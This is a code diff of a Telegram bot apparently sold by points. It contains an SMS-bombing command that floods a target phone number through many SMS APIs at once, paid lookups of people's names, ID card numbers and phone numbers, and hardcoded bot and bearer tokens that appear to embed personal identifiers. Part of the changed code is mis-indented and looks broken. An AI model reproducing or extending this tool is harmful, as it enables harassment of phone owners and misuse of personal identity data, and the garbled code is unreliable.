@@ -9,9 +9,9 @@ import itertools
 import binascii
 import random
 import concurrent.futures
-import inspect  
+import inspect  
 import urllib.parse  # 新增
-import sms_list 
+import sms_list 
 import sms_list_new
 from sms_list import *
 from Crypto.Cipher import DES3
@@ -21,11 +21,11 @@ from concurrent.futures import ThreadPoolExecutor
 
 # ================= 1. 核心配置 =================
 API_TOKEN = '8338893180:AAH-l_4m1-tweKyt92bliyk4fsPqoPQWzpU'
-ADMIN_ID = 6649617045 
+ADMIN_ID = 6649617045 
 ADMIN_USERNAME = "@aaSm68"
 POINTS_FILE = 'points.json'
 TOKEN_FILE = 'token.txt'
-DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIyNDkyNDYiLCJpYXQiOjE3Mzg1MDMxMTcsImV4cCI6MTczODY3NTkxN30.i9w1G8Y2mU5R5cCI6IkpXVCJ9" 
+DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIyNDkyNDYiLCJpYXQiOjE3Mzg1MDMxMTcsImV4cCI6MTczODY3NTkxN30.i9w1G8Y2mU5R5cCI6IkpXVCJ9" 
 
 AUTH_BEARER = "bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IisxOTM3ODg4NDgyNiIsIm9wZW5JZCI6Im95NW8tNHk3Wnd0WGlOaTVHQ3V3YzVVNDZJYk0iLCJpZENhcmRObyI6IjM3MDQ4MTE5ODgwODIwMzUxNCIsInVzZXJOYW1lIjoi6ams5rCR5by6IiwibG9naW5UaW1lIjoxNzY5NDE1NjYxMTk0LCJhcHBJZCI6Ind4ZjVmZDAyZDEwZGJiMjFkMiIsImlzcmVhbG5hbWUiOnRydWUsInNhYXNVc2VySWQiOm51bGwsImNvbXBhbnlJZCI6bnVsbCwiY29tcGFueVZPUyI6bnVsbH0.GwMYvckFHvFbhSi0NXpQDPiv9ZswUBAImN5bUipBla0"
 
@@ -33,7 +33,7 @@ bot = telebot.TeleBot(API_TOKEN)
 user_points = {}
 CURRENT_X_TOKEN = DEFAULT_TOKEN
 user_states = {}
-generated_cache = {} 
+generated_cache = {} 
 
 # --- 数据持久化 ---
 def load_data():
@@ -143,32 +143,27 @@ def query_3ys_logic(chat_id, name, id_card, phone, uid):
             'sjh': phone
         })
         url = f"https://qingfeng.qzz.io/api/free/heyan/sys1?{params}"
-        
+        
         # 扣除积分
         user_points[uid] -= 1.5
         save_points()
-        
+        
         # 返回结果
         message = f"""✅ **三要素查询链接已生成**
 
-📋 查询信息：
-👤 姓名：`{name}`
-🆔 身份证：`{id_card}`
-📱 手机号：`{phone}`
+查询信息：
+姓名：`{name}`
+身份证：`{id_card}`
+手机号：`{phone}`
 
-🔗 查询链接：
+查询链接：
 {url}
-
-⚠️ 使用说明：
-1️⃣ 点击上方链接
-2️⃣ 完成人机验证
-3️⃣ 查看核验结果
 
 已扣除 **1.5** 积分！
 当前余额：**{user_points[uid]:.2f}** 积分"""
-        
+        
         bot.send_message(chat_id, message, parse_mode='Markdown')
-        
+        
     except Exception as e:
         bot.send_message(chat_id, f"❌ 查询失败：{str(e)}")
 
@@ -274,13 +269,13 @@ def get_all_senders():
                 sig = inspect.signature(obj)
                 if len(sig.parameters) >= 1: all_funcs.append(obj)
             except: pass
-    
+    
     # 2. 获取新文件 sms_list_new.py 中的列表接口
     if hasattr(sms_list_new, 'NEW_PLATFORMS'):
         for name, func in sms_list_new.NEW_PLATFORMS:
             if func not in all_funcs:
                 all_funcs.append(func)
-                
+                
     return all_funcs
 
 @bot.message_handler(commands=['sms'])
@@ -291,11 +286,11 @@ def sms_bomb_cmd(message):
     if len(parts) < 2: return bot.reply_to(message, "用法: `/sms 手机号`")
     target = parts[1]
     if not (len(target) == 11 and target.isdigit()): return bot.reply_to(message, "⚠️ 手机号格式错误")
-    
+    
     all_funcs = get_all_senders()
     bot.reply_to(message, f"🎯 **接口装载：{len(all_funcs)}个**\n正在轰炸 `{target}`...", parse_mode='Markdown')
     user_points[uid] -= 5.5; save_points()
-    
+    
     def do_bomb():
         random.shuffle(all_funcs)
         with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
@@ -325,9 +320,9 @@ def cmd_3ys(message):
     uid = message.from_user.id
     if user_points.get(uid, 0.0) < 1.5:
         return bot.reply_to(message, "❌ 积分不足！需要 **1.5** 积分", parse_mode='Markdown')
-    
+    
     bot.send_message(
-        message.chat.id, 
+        message.chat.id, 
         "请输入三要素信息：\n\n"
         "**格式：** 姓名 身份证号 手机号\n\n"
         "**示例：**\n"
@@ -384,12 +379,8 @@ def cmd_2ys_cmd(message):
 @bot.message_handler(func=lambda m: True)
 def handle_all(message):
     uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
-    if text.startswith('/'): return 
-    
-   # ================= 新增：自动识别三要素输入（支持两种顺序） =================
-# 1. 姓名 身份证 手机
-# 2. 姓名 手机 身份证
-
+    if text.startswith('/'): return 
+    
 match_3ys_1 = re.match(r'^([\u4e00-\u9fa5]{2,4})[,/\s]+([\dXx]{15}|[\dXx]{18})[,/\s]+(1[3-9]\d{9})$', text)
 match_3ys_2 = re.match(r'^([\u4e00-\u9fa5]{2,4})[,/\s]+(1[3-9]\d{9})[,/\s]+([\dXx]{15}|[\dXx]{18})$', text)
 
@@ -403,23 +394,13 @@ if match_3ys_1 or match_3ys_2:
         name, phone, id_card = match_3ys_2.groups()
     
     return query_3ys_logic(chat_id, name, id_card, phone, uid)
-    
-    # 原有的单个手机号或身份证号识别
-    if re.match(r'^1[3-9]\d{9}$', text) or re.match(r'^\d{17}[\dXx]$', text):
-        state = user_states.get(chat_id)
-        if state and state['step'] == 'cyh_id':
-            del user_states[chat_id]
-            return xiaowunb_query_logic(chat_id, text, uid)
-            
-        if user_points.get(uid, 0.0) < 3.5: return bot.reply_to(message, "积分不足(3.5)")
-        return hb_search_logic(chat_id, text, uid)
 
     # 原有的二要素识别
     match_2ys = re.match(r'^([\u4e00-\u9fa5]{2,4})\s+(\d{17}[\dXx])$', text)
     if match_2ys:
         if user_points.get(uid, 0.0) < 0.5: return bot.reply_to(message, "积分不足(0.5)")
         return single_verify_2ys(chat_id, *match_2ys.groups(), uid)
-    
+    
     state = user_states.get(chat_id)
     if not state: return
     if state['step'] == 'v_name':
